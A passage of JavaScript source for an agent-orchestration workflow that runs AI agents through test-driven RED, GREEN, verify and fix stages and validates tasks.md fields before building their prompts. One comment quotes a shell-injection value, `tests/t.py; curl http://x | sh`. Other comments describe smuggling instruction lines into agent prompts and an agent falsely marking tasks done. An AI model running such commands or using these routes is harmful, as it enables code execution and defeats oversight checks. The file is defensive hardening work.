      schema: LOAD_SCHEMA,
      agentType: 'ranger-pathfinder'
    }
  );
}

// Enum-shaped state is never allowed to fall through to success: a marker or
// kind outside the expected set blocks rather than silently routing the task
// as open or as done.
//
// D-09 (spec.md:108-113): task.id also gets its own two checks here, BEFORE
// any read-back regex is ever built from it — an id outside
// `^[A-Za-z0-9._-]+$` (e.g. `.*`, `[x`) could otherwise turn a read-back
// string test vacuously true, and a duplicate id across tasks.md would make
// the read-back match ambiguous between two different tasks.
function taskShapeBlockers(tasks) {
  const blockers = [];
  const idCounts = new Map();
  tasks.forEach(function check(task, index) {
    const where = `tasks.md entry #${index + 1} (${(task && task.id) || 'no id'})`;
    if (!task || typeof task !== 'object') {
      blockers.push(`${where}: not a task object`);
      return;
    }
    if (TASK_MARKERS.indexOf(task.marker) === -1) {
      blockers.push(
        `${where}: unrecognised status marker "${truncate(task.marker, 40)}" — refusing to guess whether it is open or done`
      );
    }
    if (TASK_KINDS.indexOf(task.kind) === -1) {
      blockers.push(
        `${where}: unrecognised kind "${truncate(task.kind, 40)}" — refusing to guess whether it needs a TDD loop`
      );
    }
    // M4 (merged-task id token): stdd-plan's module-convergence rule can
    // report one task's id as a comma-joined list of scenario ids (e.g.
    // `S-03,S-04`). CHANGE_NAME_RE itself is deliberately left untouched
    // (it still rejects a bare comma) so directory-name validation
    // elsewhere is not loosened by this — only THIS acceptance check is
    // widened, by validating each comma-split token against the exact same
    // strict per-token charset/traversal rule individually. A garbage id
    // like `S-03,../../etc` still blocks, because its second token fails
    // CHANGE_NAME_RE on its own.
    const idTokens = String(task.id).split(',');
    if (idTokens.some((token) => !CHANGE_NAME_RE.test(token))) {
      blockers.push(
        `${where}: task.id "${truncate(task.id, 40)}" does not match ^[A-Za-z0-9._-]+$ (or a comma-joined list ` +
          'of such tokens) — refusing to build a read-back regex from it'
      );
    } else {
      idCounts.set(task.id, (idCounts.get(task.id) || 0) + 1);
    }
    // Adversarial-council finding N1: task.testFile is interpolated into a
    // shell command string (`shasum -a 256 ${task.testFile}`) at the RED,
    // GREEN and verify dispatch prompts below — a tasks.md line whose test
    // file cites something like `tests/t.py; curl http://x | sh` would ride
    // that interpolation straight into command execution once an agent runs
    // the prompt literally. Same charset as CHANGE_DIR_ILLEGAL_CHAR_RE (no
    // shell metacharacters, no whitespace, no control characters), plus an
    // absolute-path/`..`-segment check, mirroring the changeDir gate in
    // run() — this is the same injection class on a field that gate never
    // covered. Scoped to `isTddTask(task)` only (scenario/infra): those are
    // the only kinds that ever reach the RED/GREEN/verify dispatches that
    // build this shell command — a `manual`-kind task legitimately reports
    // testFile="" (nothing to test) and must not be blocked for that.
    if (isTddTask(task)) {
      if (typeof task.testFile !== 'string' || !task.testFile) {
        blockers.push(`${where}: testFile is empty — refusing to build a shell command around it`);
      } else if (task.testFile.charAt(0) === '/') {
        blockers.push(`${where}: testFile "${truncate(task.testFile, 80)}" must be a relative path, not absolute`);
      } else if (CHANGE_DIR_ILLEGAL_CHAR_RE.test(task.testFile)) {
        blockers.push(
          `${where}: testFile "${truncate(task.testFile, 80)}" contains characters outside [A-Za-z0-9/._-] ` +
            '(no shell metacharacters, whitespace, or control characters) — refusing to interpolate it into a shell command'
        );
      } else if (task.testFile.split('/').indexOf('..') !== -1) {
        blockers.push(`${where}: testFile "${truncate(task.testFile, 80)}" must not contain a '..' path segment`);
      }
      // testFunction only ever reaches prompt text and test-name patterns
      // (never a shell command string), so it is not charset-restricted the
      // same way — only control characters/newlines are rejected, since
      // those could otherwise smuggle extra instruction lines into a
      // dispatch prompt. M3 fix (2026-07-28): was the narrow C0-only
      // /[\x00-\x1f]/, unlike its sibling fields (title,
      // verificationCommand, below) which already use the wider
      // PROMPT_CONTROL_CHAR_RE — a U+2028/U+2029 line separator or a C1
      // control character slipped through undetected on this one field.
      if (typeof task.testFunction === 'string' && PROMPT_CONTROL_CHAR_RE.test(task.testFunction)) {
        blockers.push(`${where}: testFunction contains a control character or newline — refusing to use it in a prompt`);
      }
      // Adversarial-council finding J1 (round 3): task.title and
      // task.verificationCommand come from the same tasks.md read as
      // testFunction above, but had no validation anywhere — title reaches
      // taskLabel()'s prompt text (resetWipStage/redStage/greenStage/
      // verifyStage/doneStage dispatches), and verificationCommand is
      // interpolated raw into prompts that instruct the agent to RUN it
      // (resetWipStage's probe, redStage, greenStage, verifyStage). A
      // newline in either can smuggle an extra instruction line into that
      // dispatch prompt — the same injection class testFunction's check
      // exists to stop. verificationCommand is NOT charset-restricted beyond
      // control characters (unlike testFile): it is legitimately a shell
      // command string with spaces, flags, and quotes.
      //
      // Scoping decision: kept inside this `isTddTask(task)` branch, same as
      // testFunction — a `manual`-kind task's title/verificationCommand are
      // required by the load schema but never reach any prompt in this file:
      // the pipeline that calls taskLabel()/interpolates verificationCommand
      // only ever runs over `openTddTasks` (scenario/infra).
      // The manual gate's checklist text (`manualChecklist[].text`) is a
      // separate field the load dispatch reads directly from tasks.md's own
      // "Manual verification checklist" section — not derived from task.title
      // or task.verificationCommand — so it is validated separately, by
      // `manualChecklistBlockers`, which the load gate calls before any
      // REVIEW_REQUIRED result can carry that text.
      if (typeof task.title === 'string' && PROMPT_CONTROL_CHAR_RE.test(task.title)) {
        blockers.push(`${where}: title contains a control character or newline — refusing to use it in a prompt`);
      }
      if (typeof task.verificationCommand === 'string' && PROMPT_CONTROL_CHAR_RE.test(task.verificationCommand)) {
        blockers.push(
          `${where}: verificationCommand contains a control character or newline — refusing to use it in a prompt`
        );
      }
    }
  });
  idCounts.forEach(function reportDuplicates(count, id) {
    if (count > 1) {
      blockers.push(
        `duplicate task.id "${id}" appears ${count} times in tasks.md — refusing to let read-back matching become ambiguous`
      );
    }
  });
  return blockers;
}

// Self-reported gap (dispatch follow-up to J1, 2026-07-28):
// manualChecklist[].text is agent-supplied free text read directly from
// tasks.md's "Manual verification checklist" section (loadChange, above) and
// reaches the calling session's REVIEW_REQUIRED output, presented to a human
// for confirmation — the same injection surface J1 closed for
// task.title/task.verificationCommand above, but on a field
// taskShapeBlockers never touches: manualChecklist is a separate array, not a
// task row, so it needs its own gate. Same PROMPT_CONTROL_CHAR_RE charset
// check for text, and the same id grammar (CHANGE_NAME_RE) task.id already
// enforces for entry.id, since manualChecklist ids are never fed through
// taskShapeBlockers either.
function manualChecklistBlockers(checklist) {
  const blockers = [];
  checklist.forEach(function check(entry, index) {
    const where = `manual checklist entry #${index + 1} (${(entry && entry.id) || 'no id'})`;
    if (!entry || typeof entry !== 'object') {
      blockers.push(`${where}: not a checklist object`);
      return;
    }
    if (!CHANGE_NAME_RE.test(String(entry.id))) {
      blockers.push(
        `${where}: id "${truncate(entry.id, 40)}" does not match ^[A-Za-z0-9._-]+$ — refusing to trust it in a report presented to a human`
      );
    }
    if (typeof entry.text === 'string' && PROMPT_CONTROL_CHAR_RE.test(entry.text)) {
      blockers.push(
        `${where}: text contains a control character or newline — refusing to present it to a human unmodified`
      );
    }
  });
  return blockers;
}

// REQ-11/S-16 (spec.md:617-641, tasks.md:349-355), updated by M2
// (token-reduction): `[INFRA]` tasks are accepted here alongside `scenario`
// tasks so both still count as "needs a TDD loop" — but run() (see the
// infra-first split around the `openInfraTasks`/`openScenarioTasks` split,
// phase 'Execute tasks') no longer hands both kinds to pipeline() together.
// Infra tasks are driven serially, through the same stage chain, BEFORE any
// scenario task is dispatched, and a blocked infra task stops the run before
// pipeline() is ever invoked. The `[INFRA]` fast-path (skip straight to
// verification, no RED/GREEN dispatch rounds) described in
// stdd-execute/SKILL.md is still NOT implemented — infra tasks still go
// through the full RED/GREEN/verify/mark-done chain, just serially and first.
function isTddTask(task) {
  return task.kind === 'scenario' || task.kind === 'infra';
}

// REQ-20 G-01/S-29: cross-checks loadChange's returned task array against
// the custody script's own TASKS: line, so a load dispatch that silently
// truncates tasks.md (the wf_ed5d5e1a-476 incident) is caught here rather
// than allowed to proceed with a shrunk task list. A missing or malformed
// `tasksLine` is a different named stage (`custody` / `load:no-task-count`,
// S-33/G-02) that run() already returns BLOCKED on before this function is
// ever reached — so `match` here is never null in practice, but this
// function stays defensive (returns no blockers rather than throwing) for
// any future caller that skips that earlier gate.
function reconcileTaskCount(tasksLine, tasks) {
  const match = TASKS_LINE_RE.exec(String(tasksLine || '').trim());
  if (!match) {
    return [];
  }
  const expected = {
    open: Number(match[1]),
    wip: Number(match[2]),
    done: Number(match[3]),
    manual: Number(match[4]),
    infra: Number(match[5])
  };
  const expectedIds = match[6].split(';');
  const blockers = [];

  const expectedTotal = expected.open + expected.wip + expected.done;
  if (tasks.length !== expectedTotal) {
    blockers.push(
      `loadChange returned ${tasks.length} task(s), but the custody TASKS: line counts ` +
        `open+wip+done=${expectedTotal}`
    );
  }

  const manualCount = tasks.filter(function isManual(task) {
    return task.kind === 'manual';
  }).length;
  if (manualCount !== expected.manual) {
    blockers.push(
      `loadChange returned ${manualCount} manual-tagged task(s), but the TASKS: line reports manual=${expected.manual}`
    );
  }

  const infraCount = tasks.filter(function isInfra(task) {
    return task.kind === 'infra';
  }).length;
  if (infraCount !== expected.infra) {
    blockers.push(
      `loadChange returned ${infraCount} infra-tagged task(s), but the TASKS: line reports infra=${expected.infra}`
    );
  }

  // Adversarial-council finding A: everything above cross-checks COUNTS
  // (length/manual/infra) and the id multiset/order, but never checks that
  // each returned task's own `marker` field agrees with which of
  // open/wip/done the TASKS: line says it should be in. Without this, a
  // load dispatch could return every id the TASKS: line names — satisfying
  // every check above — while reporting marker "done" on all of them; the
  // caller's openTddTasks filter (marker !== 'done') would then compute to
  // empty and the run would proceed with zero task execution, silently
  // reporting those tasks as already complete. Tally the returned tasks by
  // their marker and require agreement with expected.open/wip/done.
  const markerCounts = { todo: 0, wip: 0, done: 0 };
  tasks.forEach(function tallyMarker(task) {
    const marker = task && task.marker;
    if (Object.prototype.hasOwnProperty.call(markerCounts, marker)) {
      markerCounts[marker] += 1;
    }
  });
  if (markerCounts.todo !== expected.open) {
    blockers.push(
      `loadChange returned ${markerCounts.todo} task(s) marked todo, but the TASKS: line reports marker-mismatch: open=${expected.open}`
    );
  }
  if (markerCounts.wip !== expected.wip) {
    blockers.push(
      `loadChange returned ${markerCounts.wip} task(s) marked wip, but the TASKS: line reports marker-mismatch: wip=${expected.wip}`
    );
  }
  if (markerCounts.done !== expected.done) {
    blockers.push(
      `loadChange returned ${markerCounts.done} task(s) marked done, but the TASKS: line reports marker-mismatch: done=${expected.done}`
    );
  }

  const actualIds = tasks.map(function idOf(task) {
    return task && task.id;
  });
  // REQ-20 gap-closure (fix-execute-review-findings, 2026-07-28): this now
  // checks the MULTISET only, not position — two consecutive live runs
  // BLOCKED solely because loadChange returned the correct 34-id multiset
  // with one id transposed relative to tasks.md's true order (…S-29,S-32,
  // S-33,S-31 vs the file's own …S-29,S-31,S-32,S-33 — verified at
  // tasks.md:662/690). The custody script's TASKS: line is the trusted,
  // mechanical top-to-bottom reader; the load agent is not — so ordering
  // disagreement alone is the wrong side to block on. A missing, extra, or
  // duplicated id is still a genuine multiset disagreement and still
  // blocks here (the anti-truncation guarantee is unchanged); only the
  // ORDER the load agent replied in stops mattering — downstream execution
  // order is instead derived from the TASKS: line by
  // reorderTasksToTasksLine, below, once this check passes. Sorting (not
  // joining) preserves the comma-collision fix above: one id that happens
  // to contain a comma still cannot be mistaken for two ids, since a length
  // mismatch or an element-by-element compare still catches it. That comma-
  // collision protection is now backed by an unambiguous grammar rather than
  // relying solely on the compare shape: `expectedIds` was split on `;`
  // (TASKS_LINE_RE's own inter-task separator, v0.7.3), so a single merged
  // id's internal `,` is never split into extra phantom ids in the first
  // place — the element-wise compare here is a second, independent guard on
  // top of that, not the only thing standing between a merged id and a
  // false multiset mismatch.
  const sortedActual = actualIds.slice().sort();
  const sortedExpected = expectedIds.slice().sort();
  const idsMatch =
    sortedActual.length === sortedExpected.length &&
    sortedActual.every(function sameAt(id, position) {
      return id === sortedExpected[position];
    });
  if (!idsMatch) {
    blockers.push(
      `loadChange's task id multiset [${actualIds.join(';')}] disagrees with the ` +
        `TASKS: line's ids=${expectedIds.join(';')}`
    );
  }

  return blockers;
}

// REQ-20 gap-closure (fix-execute-review-findings, 2026-07-28): companion to
// reconcileTaskCount's now order-independent multiset check, above — once
// that check passes (so `tasks` is known to carry exactly the TASKS: line's
// ids, no more, no fewer), this reorders `tasks` to the TASKS: line's own
// sequence, so downstream execution order is derived from the trusted,
// mechanical reader rather than from however the load agent arranged its
// reply. A `tasksLine` that fails to parse (or a `tasks` array that, against
// this function's own precondition, does not carry exactly the expected
// ids) returns `tasks` unchanged rather than risk dropping or duplicating a
// task — reconcileTaskCount's blockers are what should have stopped the
// caller before this function is ever reached in that case.
function reorderTasksToTasksLine(tasksLine, tasks) {
  const match = TASKS_LINE_RE.exec(String(tasksLine || '').trim());
  if (!match) {
    return tasks;
  }
  const expectedIds = match[6].split(';');
  const byId = new Map();
  tasks.forEach(function index(task) {
    byId.set(task && task.id, task);
  });
  const reordered = expectedIds
    .map(function taskFor(id) {
      return byId.get(id);
    })
    .filter(function present(task) {
      return task !== undefined;
    });
  return reordered.length === tasks.length ? reordered : tasks;
}

// --- phase 1: per-task RED / GREEN / verify / mark-done --------------------

function taskLabel(task) {
  return `${task.id} ${task.title}`.trim();
}

// The change directory travels with the task, so a stage needs no closure over
// phase 0's scope.
function dirOf(task) {
  return task.changeDir;
}

// REQ-01/D-09 (spec.md:101-107): marker read-back evidence is bound to
// task.id, anchored on the marker's POSITION in the line — a line belonging
// to a DIFFERENT task carrying the same marker character must not satisfy
// the check, and a task-number id (e.g. `1`) must not be satisfied by a line
// whose id is merely a superstring of it (e.g. `10`). `id` is escaped as a
// literal before it reaches the regex; taskShapeBlockers has already refused
// to let an out-of-grammar or duplicate id reach this far (S-04).
function escapeRegExp(value) {
  return String(value).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
}

function markerLineMatchesId(line, markerChar, id) {
  const text = String(line === null || line === undefined ? '' : line);
  const re = new RegExp('^\\s*-\\s\\[' + escapeRegExp(markerChar) + '\\]\\s`' + escapeRegExp(id) + '`(?:\\s|$)');
  return re.test(text);
}

// M1 (token-reduction): pure acceptance check for a task's loadChange-
// captured `gwt` text, gating whether the RED/GREEN/verify prompts may
// inline it verbatim instead of telling the agent to go re-read spec.md
// itself. Deliberately conservative — anything it rejects falls back to
// today's read-it-yourself instructions (fail-open, never a BLOCKED
// outcome), so a false negative only costs the token savings, never
// correctness. Requires: a non-empty gwt; at least one `### REQ-` heading;
// an `#### <id>:` heading for EVERY comma-separated id in task.id (M4:
// a merged task's id, e.g. `S-03,S-04`, needs a heading per half); and all
// three of GIVEN/WHEN/THEN present somewhere in the text.
function gwtLooksValid(task) {
  const gwt = task && task.gwt;
  if (typeof gwt !== 'string' || gwt.trim() === '') {
    return false;
  }
  if (!/^### REQ-/m.test(gwt)) {
    return false;
  }
  const ids = String((task && task.id) || '').split(',');
  for (let i = 0; i < ids.length; i += 1) {
    const headingRe = new RegExp('^#### ' + escapeRegExp(ids[i]) + ':', 'm');
    if (!headingRe.test(gwt)) {
      return false;
    }
  }
  // Anchored to a `- GIVEN`/`- WHEN`/`- THEN` bullet line, not a bare
  // substring match — a heading title mentioning the word "THEN" in prose
  // (e.g. "malformed gwt missing THEN") must not read as a real THEN clause.
  return /^\s*-\s*GIVEN\b/m.test(gwt) && /^\s*-\s*WHEN\b/m.test(gwt) && /^\s*-\s*THEN\b/m.test(gwt);
}

// M1: builds the fenced, inlined GWT(+design excerpt) block shared by the
// RED, GREEN and verify prompts, once gwtLooksValid(task) has confirmed the
// captured text is trustworthy. Returns null when it is not, so the three
// call sites can fall back to their own today's-instructions text instead of
// inlining garbage. A literal (or blank) `designExcerpt` of "none" adds no
// text at all — the whole point of that literal is "nothing to say here".
function gwtInlineBlock(task, dir) {
  if (!gwtLooksValid(task)) {
    return null;
  }
  const lines = [`This task's scenarios: ${task.id} (full file: ${dir}/spec.md).`, '```', task.gwt, '```'];
  const excerpt = typeof task.designExcerpt === 'string' ? task.designExcerpt.trim() : '';
  if (excerpt && excerpt.toLowerCase() !== 'none') {
    lines.push('', excerpt);
  }
  return lines.join('\n');
}

// M4 Template Method: the entry-guard-then-body shape shared by the five
// stage functions below (resetWipStage, redStage, greenStage, verifyStage,
// doneStage). `guard(prev, task)` returns `{ skip: <value> }` when the
// stage's own precondition is unmet — the caller returns `<value>`
// immediately, without ever running `body` — or a falsy value when the stage
// should run. An earlier round (REQ-01, see resetWipStage's and
// editMarkerStage's own comments below) found these five stages differ in
// entry-guard shape, stage label, and return shape; this factory
// parameterizes those differences rather than forcing a shared one onto them
// — resetWipStage's guard is keyed on task.marker and skips with a fresh
// `{task, status:'ready'}`, while the other four are keyed on prev.status
// and skip by propagating `prev` unchanged.
function stage(guard, body) {
  return async function runStage(prev, task, index) {
    const gate = guard(prev, task);
    if (gate) {
      return gate.skip;
    }
    return await body(prev, task, index);
  };
}

// REQ-01 (spec.md:114-123): resetWipStage and doneStage are both "edit one
// marker, then read the line back" — this helper carries that one shared
// shape (dispatch + task.id-anchored read-back). Each caller still owns its
// own entry guard, stage label and return contract, per the same REQ's
// retraction of the earlier "differ only by marker and prompt text" claim.
async function editMarkerStage(task, index, opts) {
  const response = await agent(opts.prompt, {
    label: `${opts.dispatchLabel}-${index}-${task.id}`,
    phase: 'Execute tasks',
    schema: opts.schema,
    agentType: 'dwarf-smith',
    effort: 'low'
  });

  if (!response) {
    return { blocked: true, detail: `${opts.stageLabel} dispatch returned nothing` };
  }
  if (response[opts.successField] !== true) {
    return { blocked: true, detail: response.detail || opts.failDetail };
  }
  if (!markerLineMatchesId(response.markerLine, opts.markerChar, task.id)) {
    return {
      blocked: true,
      detail:
        `the returned task line does not carry a [${opts.markerChar}] marker anchored to task.id ` +
        `"${task.id}": "${truncate(response.markerLine, 120)}"`
    };
  }
  return { blocked: false, markerLine: response.markerLine };
}

// REQ-01/D-01 (spec.md:53-99): a task found [wip] on entry no longer branches
// on `.progress.log` content — it re-runs task.verificationCommand FIRST and
// branches on that exit code alone.
//   - exit 0 (GREEN-recovery): route straight into the ordinary
//     verify/mark-done gate via a synthetic 'green' status; the marker is
//     NOT reset, and no RED dispatch is redone. Honest disclosure (spec.md
//     :63-81): this bypasses the redHash immutability compare (there is no
//     RED-checkpoint hash from THIS process to compare against) and
//     verifyStage's own "entered from a real GREEN dispatch" assumption —
//     verifyStage is told via `recovery: true` and labels its result
//     accordingly, never reporting it identically to a normally-verified
//     task.
//   - non-zero exit (RED-recovery): unchanged from before this REQ — reset
//     the marker to [ ] (read back anchored to task.id) and let redStage
//     redo RED from scratch.
// New-honest-limit (spec.md:82-92): the discriminator itself is only an
// agent's reported exit code — this runtime has no execution path of its
// own, only dispatched agents that report back; accepted limit, not a gap
// this stage attempts to close.
const resetWipStage = stage(
  function resetWipGuard(prev, task) {
    return task.marker !== 'wip' ? { skip: { task: task, status: 'ready' } } : null;
  },
  async function resetWipBody(prev, task, index) {
    const dir = dirOf(task);
    const rerun = await agent(
      [
        `STDD interrupt-recovery probe for task ${taskLabel(task)} in ${dir}.`,
        'This task is marked [wip] but is being picked up as open work — the prior run was interrupted before reaching a verified, marked-done state.',
        ...(task.inputsHash ? [`input-files hash: ${task.inputsHash}`] : []),
        '',
        `1. Re-run \`${task.verificationCommand}\` yourself and quote the output.`,
        '2. Return the exit status of that run, verbatim.',
        '',
        'Make NO edits in this dispatch — this is a probe only, not the reset and not the RED redo. Do not touch tasks.md, .progress.log, the test file or the implementation.',
        REPORT_CONTRACT
      ].join('\n'),
      {
        label: `rerun-${index}-${task.id}`,
        phase: 'Execute tasks',
        schema: RERUN_SCHEMA,
        agentType: 'eagle-sentinel',
        model: 'sonnet',
        effort: 'low'
      }
    );

    if (!rerun) {
      return taskBlocked(task, 'reset', 're-run of verificationCommand returned nothing');
    }

    if (rerun.exitCode === 0) {
      return {
        task: task,
        status: 'green',
        redHash: null,
        redOutput: rerun.commandOutput || '',
        recovery: true,
        recoveryLabel: 'recovery: RED-checkpoint unavailable'
      };
    }

    const result = await editMarkerStage(task, index, {
      dispatchLabel: 'reset',
      stageLabel: 'reset',
      markerChar: ' ',
      successField: 'reset',
      failDetail: 'task was not reset to [ ]',
      schema: RESET_SCHEMA,
      prompt: [
        `STDD interrupt-recovery reset for task ${taskLabel(task)} in ${dir}.`,
        `The re-run of task.verificationCommand still failed: ${truncate(rerun.commandOutput, 300) || '(no output)'}`,
        '',
        `1. In ${dir}/tasks.md, change this task's status marker from \`[wip]\` back to \`[ ]\`. Change nothing else on that line, and nothing else in the file.`,
        '2. Re-read that line after the edit and return it verbatim in markerLine.',
        `3. Append \`RESET ${task.id}\` to ${dir}/.progress.log.`,
        '',
        `Do not touch \`${task.testFile}\`, the implementation, spec.md or design-ux.md in this dispatch — the RED dispatch that follows owns the test-file rewrite. If the task line cannot be found, or does not currently read \`[wip]\`, set reset=false and explain in detail — do not edit something else to make it look right.`,
        REPORT_CONTRACT
      ].join('\n')
    });

    if (result.blocked) {
      return taskBlocked(task, 'reset', result.detail);
    }
    return { task: task, status: 'ready' };
  }
);

const redStage = stage(
  function redGuard(prev) {
    return !prev || prev.status !== 'ready' ? { skip: prev } : null;
  },
  async function redBody(prev, task, index) {
    const dir = dirOf(task);
    // M1 (token-reduction): a valid gwt is inlined verbatim below so this
    // dispatch does not need to re-read spec.md itself; an invalid/missing
    // one falls open to today's read-it-yourself instruction instead of
    // blocking, with one log line recording that fallback happened.
    const gwtBlock = gwtInlineBlock(task, dir);
    if (!gwtBlock && typeof task.gwt === 'string' && task.gwt !== '') {
      log(`task ${task.id}: gwt looks malformed/invalid — falling back to the read-it-yourself RED instruction`);
    }
    const scenarioStep = gwtBlock
      ? `2. ${gwtBlock}`
      : `2. Read scenario ${task.id}'s GIVEN/WHEN/THEN from ${dir}/spec.md.`;
    // With a valid gwt inlined, the `#### <id>:` heading inside it already
    // carries the task's own scenario title — repeating task.title in this
    // top line would be redundant, and would risk a title that happens to
    // echo prompt-instruction wording (e.g. "design excerpt") reading as if
    // this dispatch had generated that wording itself. Falls back to the
    // ordinary id+title label whenever gwt is not inlined, unchanged from
    // before this feature.
    const dispatchLabel = gwtBlock ? task.id : taskLabel(task);
    const red = await agent(
      [
        `STDD RED dispatch for task ${dispatchLabel} in ${dir}.`,
        '',
        `1. FIRST append \`START ${task.id}\` to ${dir}/.progress.log. This liveness line is written before anything else, so an interruption from this point on stays detectable.`,
        scenarioStep,
        `3. Write the test function \`${task.testFunction}\` in \`${task.testFile}\`, citing ${task.id} in its docstring.`,
        `4. Run \`${task.verificationCommand}\` and confirm it fails for the intended behavioral reason — a real assertion failure, not a collection or module-resolution error. If the first run cannot even collect the test (the target module or class does not exist yet), create a MINIMAL stub whose members raise NotImplementedError, then re-run. Stubbing is part of RED.`,
        `5. ONLY NOW mark this task \`[wip]\` in ${dir}/tasks.md — after the test file is written, never before. \`[wip]\` is what closes the test file to further writes, so marking it first would lock out this dispatch's own write. This is the only place \`[wip]\` is written.`,
        `6. Compute \`shasum -a 256 ${singleQuoteShell(task.testFile)}\` and return the digest.`,
        `7. Append \`DONE ${task.id} RED\` to ${dir}/.progress.log.`,
        '',
        'Write NO implementation code in this dispatch. Set ok=false, with the reason in detail, rather than forcing a green-looking result.',
        REPORT_CONTRACT
      ].join('\n'),
      {
        label: `red-${index}-${task.id}`,
        phase: 'Execute tasks',
        schema: RED_SCHEMA,
        agentType: 'gondor-builder'
      }
    );

    if (!red) {
      return taskBlocked(task, 'red', 'RED dispatch returned nothing');
    }
    if (!red.ok) {
      return taskBlocked(task, 'red', red.detail || 'RED not established');
    }

    const problem = digestProblem('the RED baseline digest', red.testFileHash);
    if (problem) {
      return taskBlocked(task, 'red', `no usable RED baseline: ${problem}`);
    }

    return { task: task, status: 'red', redHash: normalizeHash(red.testFileHash), redOutput: red.redOutput };
  }
);

const greenStage = stage(
  function greenGuard(prev) {
    return !prev || prev.status !== 'red' ? { skip: prev } : null;
  },
  async function greenBody(prev, task, index) {
    // M1 (token-reduction): same inlined gwt(+design excerpt) block as
    // redStage — GREEN never had a "go read spec.md" instruction to fall
    // back to, so an invalid/missing gwt here just omits the block, with no
    // second fallback log (redStage already logged it once for this task).
    const gwtBlock = gwtInlineBlock(task, dirOf(task));
    const green = await agent(
      [
        `STDD GREEN + REFACTOR dispatch for task ${taskLabel(task)} in ${dirOf(task)}.`,
        '',
        `RED output that must stay explained: ${prev.redOutput}`,
        ...(gwtBlock ? ['', gwtBlock] : []),
        '',
        'GREEN:',
        `1. Write the minimum code that makes \`${task.verificationCommand}\` pass.`,
        `2. Do NOT modify \`${task.testFile}\`. The caller recorded that file's digest at the RED checkpoint and re-compares it against the digest you return; the baseline is deliberately NOT quoted to you, so report what you actually measure.`,
        '3. Run the verification command and confirm it passes, then run the full previously-passing scenario suite and confirm no regression.',
        '',
        'REFACTOR (same dispatch):',
        '4. Check SOLID violations, DRY violations and code smells; refactor ONLY where a violation actually exists, re-running the suite after each change.',
        '',
        `5. Append \`DONE ${task.id} GREEN\` to ${dirOf(task)}/.progress.log, then return \`shasum -a 256 ${singleQuoteShell(task.testFile)}\`.`,
        REPORT_CONTRACT
      ].join('\n'),
      {
        label: `green-${index}-${task.id}`,
        phase: 'Execute tasks',
        schema: GREEN_SCHEMA,
        agentType: 'gondor-builder'
      }
    );

    if (!green) {
      return taskBlocked(task, 'green', 'GREEN dispatch returned nothing');
    }

    // Fingerprint firewall, enforced by the caller rather than by the builder's
    // own promise not to touch the test file. An unusable digest blocks; it
    // never skips the comparison.
    const firewallResult = fingerprintFirewall(task, 'green', 'the post-GREEN test file digest', green.testFileHash, prev.redHash, false);
    if (firewallResult) {
      return firewallResult;
    }
    if (!green.ok) {
      return taskBlocked(task, 'green', green.detail || 'GREEN not reached');
    }

    return {
      task: task,
      status: 'green',
      redHash: prev.redHash,
      redOutput: prev.redOutput,
      greenOutput: green.output,
      refactorNotes: green.refactorNotes
    };
  }
);

async function verifyOnce(task, index, round) {
  // M1 (token-reduction): same inlined gwt(+design excerpt) block as
  // redStage/greenStage, with a soft re-check sentence — a checker acting
  // on stale/mis-copied inlined text is worse than one that re-reads the
  // file, so it is told the file wins if the two ever disagree.
  const gwtBlock = gwtInlineBlock(task, dirOf(task));
  const scenarioStep = gwtBlock
    ? `3. ${gwtBlock}\nIf in doubt, re-check against the file — the file wins.`
    : `3. Check scenario ${task.id}'s GIVEN/WHEN/THEN in ${dirOf(task)}/spec.md is actually what the test asserts.`;
  return await agent(
    [
      `Independent verification of STDD task ${taskLabel(task)} in ${dirOf(task)}. Round ${round}.`,
      'You are a fresh-context checker: judge only what you can run, not what anyone intended.',
      '',
      `1. Run \`${task.verificationCommand}\` yourself and quote the output.`,
      `2. Run the full previously-passing scenario suite and confirm no regression.`,
      scenarioStep,
      `4. Return \`shasum -a 256 ${singleQuoteShell(task.testFile)}\`.`,
      '',
      'Set pass=false with the blocking detail whenever the command does not pass. Do not repair anything yourself.',
      REPORT_CONTRACT
    ].join('\n'),
    {
      label: `verify-${index}-${task.id}-r${round}`,
      phase: 'Execute tasks',
      schema: VERIFY_SCHEMA,
      agentType: 'eagle-sentinel',
      model: 'sonnet'
    }
  );
}

const verifyStage = stage(
  function verifyGuard(prev) {
    return !prev || prev.status !== 'green' ? { skip: prev } : null;
  },
  async function verifyBody(prev, task, index) {
    let verdict = await verifyOnce(task, index, 0);

    // The round cap is this loop bound. There is no path to a third fix round.
    for (let round = 1; round <= MAX_FIX_ROUNDS && !(verdict && verdict.pass); round += 1) {
      const fix = await agent(
        [
          `Fix round ${round} of at most ${MAX_FIX_ROUNDS} for STDD task ${taskLabel(task)} in ${dirOf(task)}.`,
          `The independent verifier reported: ${(verdict && verdict.blockingDetail) || 'no result returned'}`,
          `Verifier command output: ${(verdict && verdict.commandOutput) || '(none)'}`,
          '',
          `1. Fix the implementation only. Do NOT modify \`${task.testFile}\` — the caller holds its RED-checkpoint digest and re-compares it after this round; the baseline is deliberately not quoted to you.`,
          `2. Append \`FIX ${task.id} round ${round}\` to ${dirOf(task)}/.progress.log.`,
          '3. Report what you changed. If you believe the spec or the design is wrong rather than the code, say so and change nothing — that is a plan-drift decision for the user, not yours.',
          REPORT_CONTRACT
        ].join('\n'),
        {
          label: `fix-${index}-${task.id}-r${round}`,
          phase: 'Execute tasks',
          schema: FIX_SCHEMA,
          agentType: 'gondor-builder'
        }
      );

      log(`task ${task.id}: fix round ${round}/${MAX_FIX_ROUNDS} — ${(fix && fix.summary) || 'no summary'}`);
      verdict = await verifyOnce(task, index, round);
    }

    if (!verdict || !verdict.pass) {
      return Object.assign(
        taskBlocked(
          task,
          'verify',
          `still failing after ${MAX_FIX_ROUNDS} fix rounds: ${(verdict && verdict.blockingDetail) || 'verifier returned nothing'}`
        ),
        { commandOutput: (verdict && verdict.commandOutput) || '' }
      );
    }

    // REQ-01 honest disclosure (spec.md:78-81): on the GREEN-recovery path
    // (resetWipStage set `recovery: true`, `redHash: null` — there is no
    // RED-checkpoint hash from this process to compare against) the
    // RED-checkpoint compare is skipped entirely, not silently satisfied by a
    // null/null match.
    const firewallResult = fingerprintFirewall(
      task,
      'verify',
      "the verifier's test file digest",
      verdict.testFileHash,
      prev.redHash,
      prev.recovery
    );
    if (firewallResult) {
      return firewallResult;
    }

    return {
      task: task,
      status: 'verified',
      redOutput: prev.redOutput,
      greenOutput: prev.greenOutput,
      refactorNotes: prev.refactorNotes,
      verifyOutput: verdict.commandOutput,
      recovery: prev.recovery || false,
      recoveryLabel: prev.recoveryLabel
    };
  }
);

// Nothing else in this workflow writes `[x]`. Without this stage the `[wip]`
// marker written at RED is never cleared, so the test file stays closed to
